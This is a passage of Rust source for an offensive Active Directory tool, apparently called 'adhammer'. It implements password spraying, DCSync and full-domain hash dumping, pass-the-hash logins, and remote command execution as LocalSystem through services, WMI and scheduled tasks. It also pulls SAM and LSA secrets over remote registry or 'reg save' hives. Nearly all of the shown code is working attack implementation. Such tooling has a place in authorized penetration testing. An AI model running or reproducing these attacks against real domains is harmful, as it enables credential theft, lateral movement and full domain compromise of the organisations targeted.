    /// to authenticate as for `pkinit`)
    #[arg(long)]
    target: String,
    /// Value: the SPN, member sAMAccountName, new password, RBCD trustee, or (for `pkinit`)
    /// the key .pem path — defaults to `<target>.key.pem`
    #[arg(long, default_value = "")]
    value: String,
    /// Kerberos realm (pkinit); also the AD DNS domain for --ldap389 base DN
    #[arg(long)]
    realm: Option<String>,
    /// KDC `host[:port]` (pkinit)
    #[arg(long)]
    kdc: Option<String>,
    /// add-keycred over raw LDAP-389 + NTLM SASL bind (no LDAPS) — needs --host + --realm
    #[arg(long)]
    ldap389: bool,
    /// DC host for --ldap389
    #[arg(long)]
    host: Option<String>,
}

#[derive(Parser)]
struct SprayArgs {
    /// KDC `host[:port]`
    #[arg(long)]
    kdc: String,
    /// Kerberos realm, e.g. CORP.LOCAL
    #[arg(long)]
    realm: String,
    /// Users: comma-separated list, or @file with one per line
    #[arg(long)]
    users: String,
    /// Single password to spray across all users
    #[arg(long)]
    password: String,
}

#[derive(Parser)]
struct LsaArgs {
    #[arg(long)]
    host: String,
    #[arg(long)]
    domain: String,
    #[arg(long)]
    user: String,
    #[arg(long, default_value = "")]
    password: String,
    /// Pass-the-hash: NT hash (32 hex, or LM:NT) instead of --password
    #[arg(long)]
    nt_hash: Option<String>,
    /// Name to resolve to a SID, e.g. Administrator
    #[arg(long)]
    name: String,
}

#[derive(Parser)]
struct SamrArgs {
    /// DC host or IP
    #[arg(long)]
    host: String,
    /// NetBIOS domain, e.g. CORP
    #[arg(long)]
    domain: String,
    /// Username (sAMAccountName)
    #[arg(long)]
    user: String,
    /// Password
    #[arg(long, default_value = "")]
    password: String,
    /// Pass-the-hash: NT hash (32 hex, or LM:NT) instead of --password
    #[arg(long)]
    nt_hash: Option<String>,
}

#[derive(Parser)]
struct ScanArgs {
    /// LDAP URL, e.g. ldap://dc.corp.local:389 or ldaps://dc.corp.local:636
    #[arg(long)]
    url: String,
    /// Bind identity: user@realm, DOMAIN\\user, or full DN
    #[arg(long)]
    user: String,
    /// Bind password
    #[arg(long)]
    password: String,
    /// Base DN (defaults to RootDSE defaultNamingContext)
    #[arg(long)]
    base_dn: Option<String>,
    /// Output format for `scan`: `json` (default) or `html`.
    #[arg(long, default_value = "json", value_parser = ["json", "html"])]
    format: String,
    /// KDC `host[:port]` for `roast` to actually AS-REP roast (omit = list candidates only)
    #[arg(long)]
    kdc: Option<String>,
    /// SYSVOL path for `scan` to hunt GPP cpasswords, e.g. \\corp.local\SYSVOL
    #[arg(long)]
    sysvol: Option<String>,
    /// Skip TLS certificate verification (LDAPS against a self-signed / lab DC)
    #[arg(long)]
    insecure: bool,
    /// SASL GSSAPI bind (signed LDAP over 389 via ambient Kerberos; needs `--features gssapi`)
    #[arg(long)]
    gssapi: bool,
    /// Also export the collected domain as a BloodHound .zip at this path (BloodHound CE v5 ingest JSON)
    #[arg(long)]
    bloodhound: Option<String>,
}

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt().with_target(false).init();
    let cli = Cli::parse();

    // Register the SOCKS5 pivot (if any) before any connection is made. Every owned transport
    // (smb2-client, dcerpc) and the in-tree TCP dials consult this global.
    if let Some(spec) = &cli.socks {
        match smb2_client::socks::Socks5::parse(spec) {
            Some(cfg) => {
                ui::info(&format!("routing all TCP through SOCKS5 {}", cfg.proxy));
                smb2_client::socks::set_proxy(Some(cfg));
            }
            None => {
                anyhow::bail!("invalid --socks value '{spec}' (expected [user:pass@]host:port)");
            }
        }
    }

    match cli.cmd {
        None => interactive::run(cli.old, cli.no_save).await,
        Some(cmd) => {
            if cli.json {
                dispatch_json(cmd).await
            } else {
                dispatch(cmd).await
            }
        }
    }
}

async fn dispatch_json(cmd: Command) -> Result<()> {
    let cmd_str = format!("adhammer {}", cmd_label(&cmd));
    let result = dispatch(cmd).await;
    let ar = adhammer_core::AttackResult {
        command: cmd_str,
        success: result.is_ok(),
        evidence: match &result {
            Ok(()) => String::new(),
            Err(e) => format!("{e:#}"),
        },
        finding_id: None,
    };
    println!("{}", serde_json::to_string_pretty(&ar).unwrap_or_default());
    result
}

fn cmd_label(cmd: &Command) -> &'static str {
    match cmd {
        Command::Scan(_) => "scan",
        Command::Enum(e) => match e {
            EnumCmd::Samr(_) => "enum samr",
            EnumCmd::Lsa(_) => "enum lsa",
            EnumCmd::Net(_) => "enum net",
            EnumCmd::Dns(_) => "enum dns",
            EnumCmd::Adcs(_) => "enum adcs",
            EnumCmd::Esc(_) => "enum esc",
            EnumCmd::Posture(_) => "enum posture",
            EnumCmd::Sessions(_) => "enum sessions",
            EnumCmd::Wkssvc(_) => "enum wkssvc",
            EnumCmd::Hku(_) => "enum hku",
        },
        Command::Attack(a) => match a {
            AttackCmd::Roast(_) => "attack roast",
            AttackCmd::Spray(_) => "attack spray",
            AttackCmd::Abuse(_) => "attack abuse",
            AttackCmd::Coerce(_) => "attack coerce",
            AttackCmd::Zerologon(_) => "attack zerologon",
            AttackCmd::Rbcd(_) => "attack rbcd",
            AttackCmd::Constrained(_) => "attack constrained",
            AttackCmd::Asktgt(_) => "attack asktgt",
            AttackCmd::Dcsync(_) => "attack dcsync",
            AttackCmd::Capture(_) => "attack capture",
            AttackCmd::Poison(_) => "attack poison",
            AttackCmd::Relay(_) => "attack relay",
            AttackCmd::Exec(_) => "attack exec",
            AttackCmd::Atexec(_) => "attack atexec",
            AttackCmd::Wmiexec(_) => "attack wmiexec",
            AttackCmd::Secretsdump(_) => "attack secretsdump",
            AttackCmd::Gmsa(_) => "attack gmsa",
            AttackCmd::Laps(_) => "attack laps",
            AttackCmd::Winrm(_) => "attack winrm",
            AttackCmd::Esc1(_) => "attack esc1",
            AttackCmd::IcprEsc1(_) => "attack icpr-esc1",
            AttackCmd::Golden(_) => "attack golden",
            AttackCmd::Silver(_) => "attack silver",
            AttackCmd::Ptt(_) => "attack ptt",
            AttackCmd::Unconstrained(_) => "attack unconstrained",
            AttackCmd::Badsuccessor(_) => "attack badsuccessor",
            AttackCmd::Esc4(_) => "attack esc4",
            AttackCmd::Shadowcred(_) => "attack shadowcred",
            AttackCmd::Dcshadow(_) => "attack dcshadow",
        },
        Command::Check(_) => "check adcs",
        Command::Dump(d) => match d {
            DumpCmd::Laps(_) => "dump laps",
            DumpCmd::Gmsa(_) => "dump gmsa",
        },
        Command::Auto(_) => "auto",
    }
}

async fn dispatch(cmd: Command) -> Result<()> {
    match cmd {
        Command::Scan(a) => scan(a).await,
        Command::Enum(EnumCmd::Samr(a)) => samr(a).await,
        Command::Enum(EnumCmd::Lsa(a)) => lsa(a).await,
        Command::Enum(EnumCmd::Net(a)) => netenum(a).await,
        Command::Enum(EnumCmd::Dns(a)) => dnsenum(a).await,
        Command::Enum(EnumCmd::Adcs(a)) => adcsenum(a).await,
        Command::Enum(EnumCmd::Esc(a)) => esc_registry_scan(a).await,
        Command::Enum(EnumCmd::Posture(a)) => posture_scan(a).await,
        Command::Enum(EnumCmd::Sessions(a)) => sessions(a).await,
        Command::Enum(EnumCmd::Wkssvc(a)) => wkssvc_enum(a).await,
        Command::Enum(EnumCmd::Hku(a)) => hku_enum(a).await,
        Command::Attack(AttackCmd::Roast(a)) => roast(a).await,
        Command::Attack(AttackCmd::Spray(a)) => spray(a).await,
        Command::Attack(AttackCmd::Abuse(a)) => abuse(a).await,
        Command::Attack(AttackCmd::Coerce(a)) => coerce(a).await,
        Command::Attack(AttackCmd::Zerologon(a)) => zerologon(a).await,
        Command::Attack(AttackCmd::Rbcd(a)) => rbcd(a).await,
        Command::Attack(AttackCmd::Constrained(a)) => rbcd(a).await,
        Command::Attack(AttackCmd::Asktgt(a)) => asktgt(a).await,
        Command::Attack(AttackCmd::Dcsync(a)) => dcsync(a).await,
        Command::Attack(AttackCmd::Capture(a)) => smb2_client::server::capture(&a.listen)
            .await
            .map_err(Into::into),
        Command::Attack(AttackCmd::Poison(a)) => poison::poison(a.spoof_ip).await,
        Command::Attack(AttackCmd::Relay(a)) => relay(a).await,
        Command::Attack(AttackCmd::Exec(a)) => exec_cmd(a).await,
        Command::Attack(AttackCmd::Atexec(a)) => atexec_cmd(a).await,
        Command::Attack(AttackCmd::Wmiexec(a)) => wmiexec_cmd(a).await,
        Command::Attack(AttackCmd::Secretsdump(a)) => secretsdump(a).await,
        Command::Attack(AttackCmd::Gmsa(a)) => gmsa(a).await,
        Command::Attack(AttackCmd::Laps(a)) => laps(a).await,
        Command::Attack(AttackCmd::Winrm(a)) => winrm_exec(a).await,
        Command::Attack(AttackCmd::Esc1(a)) => esc1(a).await,
        Command::Attack(AttackCmd::IcprEsc1(a)) => icpr_esc1(a).await,
        Command::Attack(AttackCmd::Golden(a)) => golden(a).await,
        Command::Attack(AttackCmd::Silver(a)) => silver(a).await,
        Command::Attack(AttackCmd::Ptt(a)) => {
            // Emit the deprecation notice when the operator reached us through the `pth` alias.
            if std::env::args().any(|a| a == "pth") {
                eprintln!(
                    "[!] `attack pth` is deprecated (industry PTH = pass-the-hash); \
                     use `attack ptt` (pass-the-ticket). Alias will be removed in 1.5.0."
                );
            }
            pth(a).await
        }
        Command::Attack(AttackCmd::Unconstrained(a)) => unconstrained(a).await,
        Command::Attack(AttackCmd::Badsuccessor(a)) => badsuccessor(a).await,
        Command::Attack(AttackCmd::Esc4(a)) => esc4(a).await,
        Command::Attack(AttackCmd::Shadowcred(a)) => shadowcred(a).await,
        Command::Attack(AttackCmd::Dcshadow(a)) => dcshadow(a).await,
        Command::Check(CheckCmd::Adcs(a)) => check_adcs(a).await,
        Command::Dump(DumpCmd::Laps(a)) => dump_laps(a).await,
        Command::Dump(DumpCmd::Gmsa(a)) => dump_gmsa(a).await,
        Command::Auto(a) => {
            guided::guided(guided::GuidedArgs {
                url: a.url,
                user: a.user,
                password: a.password,
                insecure: a.insecure,
                host: a.host,
                domain: a.domain,
                realm: a.realm,
                kdc: a.kdc,
                out: a.out,
                yes: a.yes,
                no_impact: a.no_impact,
            })
            .await
        }
    }
}

/// Full RBCD attack: S4U2Self + S4U2Proxy to obtain an impersonation ticket to the target.
async fn rbcd(a: RbcdArgs) -> Result<()> {
    let etype = adhammer_kerberos::rbcd_impersonate(
        &a.account,
        &a.account_password,
        &a.realm,
        &a.kdc,
        &a.impersonate,
        &a.target_spn,
    )
    .await?;
    println!(
        "[+] got service ticket for {} as {} (enc-part etype {etype})",
        a.target_spn, a.impersonate
    );
    println!("    RBCD chain succeeded — impersonation ticket obtained.");
    Ok(())
}

/// Ask-TGT: obtain a TGT with a password and write a reusable MIT ccache.
async fn asktgt(a: AsktgtArgs) -> Result<()> {
    let ccache = match (&a.nt_hash, &a.password) {
        (Some(h), None) => {
            let nt = parse_nt_hash(h)?;
            println!("[*] overpass-the-hash (RC4-HMAC) for {}", a.user);
            adhammer_kerberos::overpass_the_hash(&a.user, &a.realm, &a.kdc, &nt).await?
        }
        (None, Some(pw)) => adhammer_kerberos::asktgt(&a.user, &a.realm, &a.kdc, pw).await?,
        _ => anyhow::bail!("provide exactly one of --password or --nt-hash"),
    };
    let out = a.out.unwrap_or_else(|| format!("{}.ccache", a.user));
    std::fs::write(&out, &ccache)?;
    println!(
        "[+] TGT obtained for {} → {out} ({} bytes)",
        a.user,
        ccache.len()
    );
    println!("    export KRB5CCNAME={out}  (use with Kerberos-aware tooling)");
    Ok(())
}

/// DCSync: bind DRSUAPI over a sign+sealed channel, then replicate a target's secrets.
async fn dcsync(mut a: DcsyncArgs) -> Result<()> {
    a.password = resolve_secret(&a.password, "ADHAMMER_PASSWORD");
    use ms_drsr::DrsSession;

    if a.all {
        return dcsync_all(&a).await;
    }
    let mut sess = DrsSession::bind(&a.host, &a.domain, &a.user, &a.password).await?;
    match a.target {
        None => {
            let handle_hex: String = sess.handle().iter().map(|b| format!("{b:02x}")).collect();
            println!("[+] DRSBind OK — sealed replication handle {handle_hex} (no --target: bind-only check)");
        }
        Some(t) => {
            let (rid, nt, kerb) = sess.dcsync(&a.domain, &t).await?;
            let nthex: String = nt.iter().map(|b| format!("{b:02x}")).collect();
            // secretsdump format: user:rid:lmhash:nthash:::  (LM is the empty-string hash)
            println!(
                "{}:{}:aad3b435b51404eeaad3b435b51404ee:{}:::",
                t, rid, nthex
            );
            // Kerberos keys (secretsdump-style): user:etype:hexkey
            for k in &kerb {
                println!("{}:{}:{}", t, k.etype_name(), hex::encode(&k.key));
            }
        }
    }
    Ok(())
}

/// Full-domain DCSync: enumerate every account over SAMR, then replicate + decrypt each — the
/// `enum sessions` — enumerate a host's logon sessions over SRVSVC (session hunting). Each row is
/// a (user, client computer) pair; a privileged user here marks the host as a credential-theft
/// target, i.e. a `HasSession` edge into that user.
async fn sessions(a: SessionsArgs) -> Result<()> {
    use dcerpc::srvsvc::SrvsvcClient;
    use smb2_client::SmbClient;

    let mut smb = SmbClient::connect(&a.host).await?;
    smb_login(
        &mut smb,
        &a.host,
        &a.domain,
        &a.user,
        &a.password,
        &a.nt_hash,
    )
    .await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
    let pipe = smb.open_pipe("srvsvc").await?;
    let mut srv = SrvsvcClient::bind(&mut smb, pipe).await?;
    let (list, ret) = srv.enum_sessions().await?;
    if ret != 0 {
        eprintln!("[!] NetrSessionEnum returned 0x{ret:08x} (access denied? need local admin on many hosts)");
    }
    if list.is_empty() {
        eprintln!("[-] no sessions returned on {}", a.host);
    } else {
        eprintln!("[+] {} session(s) on {}:", list.len(), a.host);
        for s in &list {
            let from = if s.client.is_empty() { "?" } else { &s.client };
            println!("    {:<24} from {from}", s.user);
        }
    }
    Ok(())
}

async fn wkssvc_enum(a: SessionsArgs) -> Result<()> {
    use dcerpc::wkssvc::WkstaUserClient;
    use smb2_client::SmbClient;
    use std::collections::BTreeMap;

    let mut smb = SmbClient::connect(&a.host).await?;
    smb_login(
        &mut smb,
        &a.host,
        &a.domain,
        &a.user,
        &a.password,
        &a.nt_hash,
    )
    .await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
    let pipe = smb.open_pipe("wkssvc").await?;
    let mut wks = WkstaUserClient::bind(&mut smb, pipe).await?;
    let (list, ret) = wks.enum_users().await?;
    if ret != 0 {
        eprintln!("[!] NetrWkstaUserEnum returned {ret} (need local admin)");
    }
    let raw = list.len();
    // Dedup on (user, domain, logon_server) — one Windows box typically emits many LSA
    // sessions per principal (one per service / logon type), which for HasSession-style
    // graph building is noise. Machine accounts (`$`-suffixed) are filtered unless
    // --include-machine, since on a DC they're the flood.
    let mut grouped: BTreeMap<(String, String, String), usize> = BTreeMap::new();
    let mut machine_hidden = 0usize;
    for u in &list {
        if !a.include_machine && u.username.ends_with('$') {
            machine_hidden += 1;
            continue;
        }
        *grouped
            .entry((
                u.username.clone(),
                u.logon_domain.clone(),
                u.logon_server.clone(),
            ))
            .or_default() += 1;
    }
    if grouped.is_empty() {
        eprintln!(
            "[-] no logged-on users on {} (raw={raw}, machine-hidden={machine_hidden})",
            a.host
        );
        if machine_hidden > 0 && !a.include_machine {
            eprintln!("    pass --include-machine to show machine-account sessions");
        }
    } else {
        eprintln!(
            "[+] {} unique principal(s) on {} (raw={raw}, machine-hidden={machine_hidden}):",
            grouped.len(),
            a.host
        );
        for ((user, domain, server), count) in &grouped {
            let mark = if *count > 1 {
                format!(" ×{count}")
            } else {
                String::new()
            };
            let srv = if server.is_empty() { "(none)" } else { server };
            println!("    {domain}\\{user:<24} server={srv}{mark}");
        }
    }
    Ok(())
}

async fn hku_enum(a: SessionsArgs) -> Result<()> {
    use dcerpc::rrp::RegistryClient;
    use smb2_client::SmbClient;

    let mut smb = SmbClient::connect(&a.host).await?;
    smb_login(
        &mut smb,
        &a.host,
        &a.domain,
        &a.user,
        &a.password,
        &a.nt_hash,
    )
    .await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
    let mut reg = match RegistryClient::connect(&mut smb, &a.domain, &a.user, &a.password, &a.host)
        .await
    {
        Ok(r) => r,
        Err(e) => {
            let msg = e.to_string();
            if msg.contains("0xc00000ac") || msg.contains("open \\winreg") {
                anyhow::bail!(
                    "Remote Registry service is stopped on {} — start it or use `enum wkssvc` / `enum sessions` instead",
                    a.host
                );
            }
            return Err(e.into());
        }
    };
    let sids = reg.logged_on_sids().await?;
    if sids.is_empty() {
        eprintln!("[-] no logged-on SIDs via HKU on {}", a.host);
    } else {
        eprintln!("[+] {} logged-on SID(s) via HKU on {}:", sids.len(), a.host);
        for s in &sids {
            println!("    {}", s.sid);
        }
    }
    Ok(())
}

/// whole-domain NTDS dump (secretsdump `@dc`). Reuses SAMR enumeration and per-account DCSync
/// (which now reassembles multi-fragment replies, so large/computer accounts work too).
async fn dcsync_all(a: &DcsyncArgs) -> Result<()> {
    use dcerpc::samr::SamrClient;
    use ms_drsr::DrsSession;
    use smb2_client::SmbClient;

    // 1. enumerate accounts via SAMR-over-SMB.
    let mut smb = SmbClient::connect(&a.host).await?;
    smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
    let pipe = smb.open_pipe("samr").await?;
    let mut samr = SamrClient::bind(&mut smb, pipe).await?;
    let mut users = samr.enumerate_all_users(&format!("\\\\{}", a.host)).await?;

    // Interactive-terminal safety gate. `--all` on a fat-fingered command dumps
    // every account in the domain; require --yes when we can see the operator's
    // TTY. Non-TTY callers (CI / piped runs) bypass the prompt.
    use std::io::IsTerminal as _;
    if !a.yes && std::io::stdout().is_terminal() {
        anyhow::bail!(
            "`--all` will DCSync {} accounts from {} in this domain. Re-run with --yes to \
             confirm, or use --limit N for a scoped run first.",
            users.len(),
            a.host
        );
    }

    if let Some(n) = a.limit {
        if users.len() > n {
            eprintln!(
                "[*] --limit {n} — capping bulk run at {n} of {} enumerated accounts",
                users.len()
            );
            users.truncate(n);
        }
    }

    eprintln!(
        "[+] {} accounts scheduled for replication…",
        users.len()
    );

    // 2. DCSync each over one sealed DRSUAPI session.
    let mut sess = DrsSession::bind(&a.host, &a.domain, &a.user, &a.password).await?;
    let (mut ok, mut fail) = (0u32, 0u32);
    for (_rid, name) in &users {
        match sess.dcsync(&a.domain, name).await {
            Ok((rid, nt, kerb)) => {
                let nthex: String = nt.iter().map(|b| format!("{b:02x}")).collect();
                println!(
                    "{}:{}:aad3b435b51404eeaad3b435b51404ee:{}:::",
                    name, rid, nthex
                );
                for k in &kerb {
                    println!("{}:{}:{}", name, k.etype_name(), hex::encode(&k.key));
                }
                ok += 1;
            }
            Err(e) => {
                tracing::warn!("dcsync {name} failed: {e}");
                fail += 1;
            }
        }
    }
    eprintln!("[+] full-domain DCSync complete: {ok} dumped, {fail} failed");
    Ok(())
}

/// Remote code execution over SVCCTL: create a LocalSystem service running the command, start
/// it, delete it. Blind (no output) — pair with a listener or redirect to a share for results.
/// Resolve a credential-flag value that came in through argv. If the operator
/// passed an empty `--password` / `--nt-hash` (the recommended way to avoid the
/// `ps` / shell-history leak), we fall back to the matching env var — currently
/// `ADHAMMER_PASSWORD` and `ADHAMMER_NT_HASH`. Non-empty argv values pass
/// through unchanged (backwards-compatible; scripts that already inline
/// creds keep working). When the flag was not set AND the env var is empty,
/// we return the empty string and let the downstream call fail with its own
/// domain-specific error, so we don't confuse "meant to set it, forgot" with
/// "this attack doesn't actually need auth".
///
/// Rationale: the boss review flagged that every subcommand takes secrets
/// straight on argv (`sec-2`), leaking to `ps`, `~/.bash_history`, sudo logs.
/// A companion helper `--password-file` / interactive prompt lives in the
/// full 1.4.1 CLI overhaul; this env-var path is the smallest useful hop
/// today and matches how CI already prefers to inject secrets.
fn resolve_secret(argv_value: &str, env_key: &str) -> String {
    if !argv_value.is_empty() {
        return argv_value.to_string();
    }
    std::env::var(env_key).unwrap_or_default()
}

/// Parse an NT hash from `--nt-hash` (accepts bare 32-hex or `LM:NT`).
fn parse_nt_hash(s: &str) -> Result<[u8; 16]> {
    let hex_str = s.rsplit(':').next().unwrap_or(s).trim();
    let raw = hex::decode(hex_str).context("--nt-hash must be hex")?;
    anyhow::ensure!(
        raw.len() == 16,
        "--nt-hash must be a 32-hex NT hash (got {} bytes)",
        raw.len()
    );
    Ok(raw.try_into().unwrap())
}

/// Parse a ticket-forging key: a 16-byte NT hash (32 hex) for RC4, else a 32-byte AES256 key.
fn parse_forge_key(s: &str, rc4: bool) -> Result<Vec<u8>> {
    let raw = hex::decode(s.trim()).context("forge key must be hex")?;
    let want = if rc4 { 16 } else { 32 };
    anyhow::ensure!(
        raw.len() == want,
        "expected a {}-hex {} key, got {} hex",
        want * 2,
        if rc4 { "RC4/NT-hash" } else { "AES256" },
        raw.len() * 2
    );
    Ok(raw)
}

/// SMB login with either a password or an NT hash (pass-the-hash).
async fn smb_login(
    smb: &mut smb2_client::SmbClient,
    host: &str,
    domain: &str,
    user: &str,
    password: &str,
    nt_hash: &Option<String>,
) -> Result<()> {
    match nt_hash {
        Some(h) => {
            let nt = parse_nt_hash(h)?;
            smb.login_hash(host, domain, user, &nt).await?;
        }
        None => {
            anyhow::ensure!(!password.is_empty(), "provide --password or --nt-hash");
            smb.login(host, domain, user, password).await?;
        }
    }
    Ok(())
}

async fn exec_cmd(mut a: ExecArgs) -> Result<()> {
    a.password = resolve_secret(&a.password, "ADHAMMER_PASSWORD");
    use smb2_client::SmbClient;
    let mut smb = SmbClient::connect(&a.host).await?;
    smb_login(
        &mut smb,
        &a.host,
        &a.domain,
        &a.user,
        &a.password,
        &a.nt_hash,
    )
    .await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
    let r = dcerpc::svcctl::exec(&mut smb, &a.host, &a.command).await?;
    let clean = if r.cleaned {
        "service cleaned up"
    } else {
        "SERVICE NOT DELETED"
    };
    if r.ran {
        println!(
            "[+] executed as LocalSystem (service '{}', start win32 {}); {clean}",
            r.service, r.start_win32
        );
    } else {
        println!("[-] service '{}' created but start returned win32 {} (command may not have run); {clean}", r.service, r.start_win32);
    }
    match r.output {
        Some(o) if !o.is_empty() => println!("\n{o}"),
        Some(_) => println!("[*] command produced no output"),
        None => println!("[*] output not captured (see warnings; command may still have run)"),
    }
    Ok(())
}

/// wmiexec: remote code execution over WMI (DCOM `Win32_Process.Create`). The process runs detached
/// under WmiPrvSE, so the command is redirected to a temp file and read back over C$ — no service or
/// scheduled task is created (distinct host telemetry from `exec`/`atexec`).
async fn wmiexec_cmd(mut a: ExecArgs) -> Result<()> {
    a.password = resolve_secret(&a.password, "ADHAMMER_PASSWORD");
    use smb2_client::SmbClient;
    let hash = a.nt_hash.as_deref().map(parse_nt_hash).transpose()?;
    anyhow::ensure!(
        !a.password.is_empty() || hash.is_some(),
        "provide --password or --nt-hash"
    );
    // Unique output path under C:\Windows\Temp, redirected inside a cmd wrapper.
    let tag = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0)
        & 0xff_ffff;
    let out_rel = format!("Windows\\Temp\\ADHwmi{tag:06x}.out");
    let out_abs = format!("C:\\{out_rel}");
    let wrapped = format!("cmd.exe /Q /c {} > {out_abs} 2>&1", a.command);

    let hr = dcerpc::dcom_wmi::wmi_exec(
        &a.host,
        &a.domain,
        &a.user,
        &a.password,
        hash.as_ref(),
        "ADHAMMER",
        &wrapped,
    )
    .await?;
    if hr != 0 {
        crate::ui::warn(&format!(
            "Win32_Process.Create returned HRESULT 0x{:08x} (command may not have run)",
            hr as u32
        ));
    } else {
        crate::ui::ok("process created via WMI (Win32_Process.Create)");
    }

    // The process is detached — poll-read the output file over C$ until it lands.
    let mut smb = SmbClient::connect(&a.host).await?;
    smb_login(
        &mut smb,
        &a.host,
        &a.domain,
        &a.user,
        &a.password,
        &a.nt_hash,
    )
    .await?;
    smb.tree_connect(&format!("\\\\{}\\C$", a.host)).await?;
    let mut out = None;
    for _ in 0..24 {
        match smb.read_file_delete(&out_rel).await {
            Ok(b) => {
                out = Some(b);
                break;
            }
            Err(_) => tokio::time::sleep(std::time::Duration::from_millis(300)).await,
        }
    }
    match out {
        Some(b) if !b.is_empty() => {
            let s = String::from_utf8_lossy(&b);
            println!("\n{}", s.trim_end());
        }
        Some(_) => crate::ui::info("command produced no output"),
        None => crate::ui::info("output not captured (command may still have run)"),
    }
    Ok(())
}

/// atexec: remote code execution as LocalSystem via a scheduled task (MS-TSCH), with output
/// captured over C$. Alternative to `exec` (SVCCTL) — different host telemetry.
async fn atexec_cmd(mut a: ExecArgs) -> Result<()> {
    a.password = resolve_secret(&a.password, "ADHAMMER_PASSWORD");
    use smb2_client::SmbClient;
    let mut smb = SmbClient::connect(&a.host).await?;
    smb_login(
        &mut smb,
        &a.host,
        &a.domain,
        &a.user,
        &a.password,
        &a.nt_hash,
    )
    .await?;

    let tag = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.subsec_nanos())
        .unwrap_or(0);
    let out_rel = format!("Windows\\Temp\\ADhat{tag:08x}.out");
    let full = format!("{} > C:\\{out_rel} 2>&1", a.command);

    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
    let (path, run_hr) =
        dcerpc::tsch::atexec(&mut smb, &full, &a.domain, &a.user, &a.password, &a.host).await?;
    println!("[+] scheduled task {path} registered + run as LocalSystem (run HRESULT 0x{run_hr:08x}); deleted");

    smb.tree_connect(&format!("\\\\{}\\C$", a.host)).await?;
    match smb.read_file_delete(&out_rel).await {
        Ok(b) if !b.is_empty() => println!(
            "\n{}",
            String::from_utf8_lossy(&b).replace('\r', "").trim_end()
        ),
        Ok(_) => println!("[*] command produced no output"),
        Err(e) => println!("[*] output not captured: {e}"),
    }
    Ok(())
}

/// Local secretsdump: run `reg save` for SYSTEM + SAM as LocalSystem, pull the hives over C$,
/// then decrypt the local account NT hashes offline (bootkey → SAM key → per-user).
async fn secretsdump(mut a: SecretsdumpArgs) -> Result<()> {
    a.password = resolve_secret(&a.password, "ADHAMMER_PASSWORD");
    use smb2_client::SmbClient;
    let mut smb = SmbClient::connect(&a.host).await?;
    smb_login(
        &mut smb,
        &a.host,
        &a.domain,
        &a.user,
        &a.password,
        &a.nt_hash,
    )
    .await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;

    // Fast path: pull the bootkey directly via MS-RRP (WINREG API). Four tiny RPC
    // roundtrips for the Lsa\{JD,Skew1,GBG,Data} key CLASS NAMES — no `reg save HKLM\SYSTEM`,
    // no 15 MB hive download, no polling. Only falls back to the hive-save path if the
    // Remote Registry service is unreachable.
    // Fast path: full RRP secretsdump (bootkey + SAM users + LSA secrets) — no `reg save`
    // anywhere. Falls back to the hive-save path if Remote Registry is off or any RRP step fails.
    let mut rrp_sam: Option<Vec<adhammer_secrets::SamAccount>> = None;
    let mut rrp_lsa: Option<Vec<adhammer_secrets::LsaSecret>> = None;
    let bootkey_rrp = {
        let mut reg = match dcerpc::rrp::RegistryClient::connect(
            &mut smb,
            &a.domain,
            &a.user,
            &a.password,
            &a.host,
        )
        .await
        {
            Ok(r) => Some(r),
            Err(e) => {
                eprintln!(
                    "[!] Remote Registry unreachable ({e}) — falling back to `reg save` hives"
                );
                None
            }
        };
        match reg.as_mut() {
            Some(r) => {
                // Open HKLM once and reuse it across all three RRP calls — saves 4 RPC
                // roundtrips (2 opens + 2 closes) versus opening HKLM inside each helper.
                match r.hklm().await {
                    Ok(hklm) => {
                        let bk_res = adhammer_secrets::bootkey_via_rrp_hklm(r, &hklm).await;
                        let bk_opt = match bk_res {
                            Ok(bk) => {
                                eprintln!(
                                    "[+] bootkey via RRP: {}",
                                    bk.iter().map(|b| format!("{b:02x}")).collect::<String>()
                                );
                                if let Ok(users) =
                                    adhammer_secrets::dump_sam_via_rrp_hklm(r, &hklm, &bk).await
                                {
                                    eprintln!("[+] SAM via RRP: {} account(s)", users.len());
                                    rrp_sam = Some(users);
                                }
                                if let Ok(secrets) =
                                    adhammer_secrets::dump_lsa_via_rrp_hklm(r, &hklm, &bk).await
                                {
                                    eprintln!("[+] LSA via RRP: {} secret(s)", secrets.len());
                                    rrp_lsa = Some(secrets);
                                }
                                Some(bk)
                            }
                            Err(e) => {
                                eprintln!(
                                    "[!] RRP bootkey failed ({e}) — falling back to `reg save` hives"
                                );
                                None
                            }
                        };
                        r.close_handle(&hklm).await;
                        bk_opt
                    }
                    Err(e) => {
                        eprintln!(
                            "[!] RRP OpenHKLM failed ({e}) — falling back to `reg save` hives"
                        );
                        None
                    }
                }
            }
            None => None,
        }
    };

    // Skip `reg save` for anything RRP already delivered. If RRP handled EVERYTHING (bootkey
    // + SAM + LSA) we never touch SVCCTL/`reg save` — the hive-based fallback is only for
    // hives whose data we still need.
    let sys_rel = "Windows\\Temp\\ADh_sys.tmp";
    let sam_rel = "Windows\\Temp\\ADh_sam.tmp";
    let sec_rel = "Windows\\Temp\\ADh_sec.tmp";
    let want_system = bootkey_rrp.is_none();
    let want_sam = rrp_sam.is_none();
    let want_security = rrp_lsa.is_none();
    let mut hives: Vec<(&str, &str)> = Vec::new();
    if want_system {
        hives.push(("SYSTEM", sys_rel));
    }
    if want_sam {
        hives.push(("SAM", sam_rel));
    }
    if want_security {
        hives.push(("SECURITY", sec_rel));
    }
    for (hive, rel) in &hives {
        smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
        let cmd = format!("reg save HKLM\\{hive} C:\\{rel} /y");
        let ret = dcerpc::svcctl::run(&mut smb, &cmd).await?;
        tracing::info!("reg save {hive}: SCM start win32 {ret}");
    }

    let (system, sam, security) = if hives.is_empty() {
        (None, None, None)
    } else {
        smb.tree_connect(&format!("\\\\{}\\C$", a.host)).await?;
        let sys = if want_system {
            Some(
                smb.read_file_delete(sys_rel)
                    .await
